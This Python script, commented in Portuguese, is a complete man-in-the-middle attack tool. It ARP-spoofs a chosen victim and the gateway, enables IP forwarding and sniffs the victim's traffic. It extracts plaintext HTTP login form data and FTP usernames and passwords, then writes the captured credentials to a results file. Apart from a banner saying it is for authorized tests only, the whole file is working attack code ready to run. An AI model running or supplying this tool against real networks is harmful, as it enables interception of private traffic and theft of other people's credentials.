#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import threading
import socket
import netifaces
import re
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, getmacbyip
from datetime import datetime

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class MITMAttack:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.attack_running = False
        self.packet_count = 0
        self.credentials = []
        self.intercepted_data = []
        
    def check_dependencies(self):
        """Verifica e instala dependências necessárias"""
        dependencies = [
            'scapy',
            'netifaces',
            'netaddr',
            'requests'
        ]
        
        print(f"{Colors.BLUE}[*]{Colors.RESET} Verificando dependências...")
        
        for dep in dependencies:
            try:
                __import__(dep)
                print(f"{Colors.GREEN}[+]{Colors.RESET} {dep} instalado")
            except ImportError:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} {dep} não encontrado, instalando...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                    print(f"{Colors.GREEN}[+]{Colors.RESET} {dep} instalado com sucesso")
                except subprocess.CalledProcessError:
                    print(f"{Colors.RED}[-]{Colors.RESET} Falha ao instalar {dep}")
                    return False
        
        # Verificar se é root (necessário para MITM)
        if os.geteuid() != 0:
            print(f"{Colors.RED}[-]{Colors.RESET} Este script precisa ser executado como root!")
            return False
            
        return True

    def get_network_info(self):
        """Obtém informações da rede"""
        print(f"{Colors.BLUE}[*]{Colors.RESET} Detectando interfaces de rede...")
        
        interfaces = netifaces.interfaces()
        for i, iface in enumerate(interfaces):
            if iface != 'lo':  # Ignorar loopback
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    print(f"{Colors.CYAN}[{i}]{Colors.RESET} {iface} - {ip}")
        
        try:
            iface_index = int(input(f"{Colors.YELLOW}[?]{Colors.RESET} Selecione a interface: "))
            self.interface = interfaces[iface_index]
        except (ValueError, IndexError):
            print(f"{Colors.RED}[-]{Colors.RESET} Seleção inválida!")
            return False
        
        # Obter gateway
        gateways = netifaces.gateways()
        if 'default' in gateways and netifaces.AF_INET in gateways['default']:
            self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
            print(f"{Colors.GREEN}[+]{Colors.RESET} Gateway detectado: {self.gateway_ip}")
        else:
            self.gateway_ip = input(f"{Colors.YELLOW}[?]{Colors.RESET} Digite o IP do gateway: ")
        
        # Obter alvo
        self.target_ip = input(f"{Colors.YELLOW}[?]{Colors.RESET} Digite o IP do alvo: ")
        
        return True

    def enable_ip_forwarding(self):
        """Habilita o forwarding de IP no sistema"""
        print(f"{Colors.BLUE}[*]{Colors.RESET} Habilitando IP forwarding...")
        
        if sys.platform.startswith('linux'):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        elif sys.platform.startswith('darwin'):  # macOS
            os.system("sysctl -w net.inet.ip.forwarding=1")
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} IP forwarding habilitado")

    def disable_ip_forwarding(self):
        """Desabilita o forwarding de IP no sistema"""
        print(f"{Colors.BLUE}[*]{Colors.RESET} Desabilitando IP forwarding...")
        
        if sys.platform.startswith('linux'):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        elif sys.platform.startswith('darwin'):
            os.system("sysctl -w net.inet.ip.forwarding=0")
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} IP forwarding desabilitado")

    def arp_spoof(self, target_ip, spoof_ip):
        """Executa ARP spoofing"""
        target_mac = getmacbyip(target_ip)
        if target_mac is None:
            print(f"{Colors.RED}[-]{Colors.RESET} Não foi possível obter MAC de {target_ip}")
            return
        
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def arp_restore(self, target_ip, gateway_ip):
        """Restaura o ARP table da vítima"""
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if target_mac and gateway_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                         psrc=gateway_ip, hwsrc=gateway_mac)
            send(packet, verbose=False, count=5)

    def packet_callback(self, packet):
        """Callback para processar pacotes capturados"""
        if not self.attack_running:
            return
            
        self.packet_count += 1
        
        # Exibir informações básicas do pacote
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            protocol = packet[IP].proto
            
            # Filtrar apenas tráfego do alvo
            if src_ip == self.target_ip or dst_ip == self.target_ip:
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                # Detectar protocolos específicos
                if packet.haslayer(TCP):
                    sport = packet[TCP].sport
                    dport = packet[TCP].dport
                    
                    # HTTP
                    if dport == 80 or sport == 80:
                        print(f"{Colors.YELLOW}[{timestamp}]{Colors.RESET} HTTP: {src_ip}:{sport} -> {dst_ip}:{dport}")
                        if packet.haslayer(Raw):
                            self.extract_http_credentials(packet[Raw].load)
                    
                    # HTTPS (apenas info de conexão)
                    elif dport == 443 or sport == 443:
                        print(f"{Colors.GREEN}[{timestamp}]{Colors.RESET} HTTPS: {src_ip}:{sport} -> {dst_ip}:{dport}")
                    
                    # FTP
                    elif dport == 21 or sport == 21:
                        print(f"{Colors.CYAN}[{timestamp}]{Colors.RESET} FTP: {src_ip}:{sport} -> {dst_ip}:{dport}")
                        if packet.haslayer(Raw):
                            self.extract_ftp_credentials(packet[Raw].load)
                
                # DNS
                elif packet.haslayer(UDP) and (packet[UDP].dport == 53 or packet[UDP].sport == 53):
                    print(f"{Colors.PURPLE}[{timestamp}]{Colors.RESET} DNS: {src_ip} -> {dst_ip}")
                
                # Salvar pacote para análise posterior
                self.intercepted_data.append({
                    'timestamp': timestamp,
                    'src_ip': src_ip,
                    'dst_ip': dst_ip,
                    'protocol': protocol,
                    'packet': packet.summary()
                })
                
                # Exibir estatísticas a cada 10 pacotes
                if self.packet_count % 10 == 0:
                    self.show_stats()

    def extract_http_credentials(self, data):
        """Tenta extrair credenciais HTTP"""
        try:
            data_str = data.decode('utf-8', errors='ignore').lower()
            
            # Procurar por credenciais em formulários
            if 'username=' in data_str or 'password=' in data_str or 'login=' in data_str:
                print(f"{Colors.RED}[!]{Colors.RESET} Possíveis credenciais encontradas!")
                print(f"{Colors.RED}[!]{Colors.RESET} Dados: {data_str[:200]}...")
                
                # Salvar credenciais
                self.credentials.append({
                    'type': 'HTTP',
                    'data': data_str,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                
        except:
            pass

    def extract_ftp_credentials(self, data):
        """Tenta extrair credenciais FTP"""
        try:
            data_str = data.decode('utf-8', errors='ignore')
            
            # Procurar por comandos USER e PASS do FTP
            if 'USER ' in data_str:
                username = data_str.split('USER ')[1].split('\r\n')[0].strip()
                print(f"{Colors.RED}[!]{Colors.RESET} FTP Username: {username}")
                
                self.credentials.append({
                    'type': 'FTP',
                    'username': username,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                
            elif 'PASS ' in data_str:
                password = data_str.split('PASS ')[1].split('\r\n')[0].strip()
                print(f"{Colors.RED}[!]{Colors.RESET} FTP Password: {password}")
                
                # Adicionar password à última credencial FTP
                for cred in reversed(self.credentials):
                    if cred['type'] == 'FTP' and 'password' not in cred:
                        cred['password'] = password
                        break
                        
        except:
            pass

    def show_stats(self):
        """Exibe estatísticas do ataque"""
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Estatísticas do Ataque:")
        print(f"   Pacotes interceptados: {self.packet_count}")
        print(f"   Credenciais capturadas: {len(self.credentials)}")
        print(f"   Dados coletados: {len(self.intercepted_data)} entradas")
        
        # Mostrar últimas credenciais
        if self.credentials:
            print(f"\n{Colors.RED}[!]{Colors.RESET} Últimas credenciais capturadas:")
            for cred in self.credentials[-3:]:  # Últimas 3
                print(f"   {cred['type']} - {cred.get('username', 'N/A')}:{cred.get('password', 'N/A')}")

    def start_attack(self):
        """Inicia o ataque MITM"""
        print(f"{Colors.BLUE}[*]{Colors.RESET} Iniciando ataque MITM...")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Alvo: {self.target_ip}")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Gateway: {self.gateway_ip}")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Interface: {self.interface}")
        
        # Habilitar forwarding
        self.enable_ip_forwarding()
        self.attack_running = True
        
        # Iniciar thread de ARP spoofing
        def arp_loop():
            while self.attack_running:
                try:
                    self.arp_spoof(self.target_ip, self.gateway_ip)  # Para o alvo
                    self.arp_spoof(self.gateway_ip, self.target_ip)  # Para o gateway
                    time.sleep(2)
                except Exception as e:
                    print(f"{Colors.RED}[-]{Colors.RESET} Erro no ARP spoofing: {e}")
                    break
        
        arp_thread = threading.Thread(target=arp_loop, daemon=True)
        arp_thread.start()
        
        # Iniciar captura de pacotes
        print(f"{Colors.GREEN}[+]{Colors.RESET} Iniciando captura de pacotes...")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Pressione Ctrl+C para parar o ataque\n")
        
        try:
            # Filtro para capturar apenas tráfego do alvo
            filter_str = f"host {self.target_ip}"
            sniff(iface=self.interface, filter=filter_str, prn=self.packet_callback, store=0)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!]{Colors.RESET} Parando ataque...")
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.RESET} Erro na captura: {e}")
        
        finally:
            self.stop_attack()

    def stop_attack(self):
        """Para o ataque e limpa"""
        self.attack_running = False
        time.sleep(1)  # Dar tempo para a thread parar
        
        print(f"{Colors.BLUE}[*]{Colors.RESET} Restaurando tabelas ARP...")
        self.arp_restore(self.target_ip, self.gateway_ip)
        self.arp_restore(self.gateway_ip, self.target_ip)
        
        self.disable_ip_forwarding()
        
        # Salvar resultados
        self.save_results()
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} Ataque finalizado!")

    def save_results(self):
        """Salva os resultados do ataque"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mitm_results_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"MITM Attack Results - {timestamp}\n")
            f.write("=" * 50 + "\n\n")
            
            f.write(f"Target: {self.target_ip}\n")
            f.write(f"Gateway: {self.gateway_ip}\n")
            f.write(f"Interface: {self.interface}\n")
            f.write(f"Total packets: {self.packet_count}\n\n")
            
            f.write("Credentials captured:\n")
            f.write("-" * 30 + "\n")
            for cred in self.credentials:
                f.write(f"{cred['timestamp']} - {cred['type']}\n")
                for key, value in cred.items():
                    if key not in ['timestamp', 'type']:
                        f.write(f"  {key}: {value}\n")
                f.write("\n")
            
            f.write("Intercepted data (sample):\n")
            f.write("-" * 30 + "\n")
            for data in self.intercepted_data[-20:]:  # Últimos 20 pacotes
                f.write(f"{data['timestamp']} - {data['src_ip']} -> {data['dst_ip']}\n")
                f.write(f"  {data['packet']}\n\n")
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} Resultados salvos em {filename}")

    def show_banner(self):
        """Exibe banner do script"""
        print(f"""{Colors.PURPLE}
    ███╗   ███╗██╗████████╗███╗   ███╗
    ████╗ ████║██║╚══██╔══╝████╗ ████║
    ██╔████╔██║██║   ██║   ██╔████╔██║
    ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
        {Colors.RESET}""")
        print(f"{Colors.CYAN}    Man-in-the-Middle Attack Tool{Colors.RESET}")
        print(f"{Colors.CYAN}    ⚠️  APENAS PARA TESTES AUTORIZADOS ⚠️{Colors.RESET}\n")

def main():
    attack = MITMAttack()
    attack.show_banner()
    
    # Verificar dependências
    if not attack.check_dependencies():
        sys.exit(1)
    
    # Obter informações da rede
    if not attack.get_network_info():
        sys.exit(1)
    
    # Iniciar ataque
    try:
        attack.start_attack()
    except Exception as e:
        print(f"{Colors.RED}[-]{Colors.RESET} Erro durante o ataque: {e}")
    finally:
        # Garantir que tudo seja limpo
        if attack.attack_running:
            attack.stop_attack()

if __name__ == "__main__":
    main()
